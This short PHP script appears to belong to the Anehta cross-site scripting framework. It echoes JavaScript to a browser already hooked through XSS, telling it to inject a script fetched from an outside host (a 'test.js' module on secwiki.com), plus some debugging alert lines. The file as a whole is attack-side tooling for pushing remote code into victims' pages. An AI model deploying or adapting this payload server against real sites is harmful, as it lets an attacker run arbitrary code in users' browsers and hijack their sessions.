<?php
//$cmd = getenv('QUERY_STRING');  // XSS传回的数据
//header('Content-Type: application/javascript');

$cmd = "var timesig = new Date();anehta.inject.injectScript('http://www.secwiki.com/anehta/module/test.js?'+timesig);";
$cmd .= "//$('script').eq(2).removeAttr('src');//alert(2);";
$cmd .= "alert(\$d.getElementsByTagName('script')[2].src);";

echo $cmd;
?>
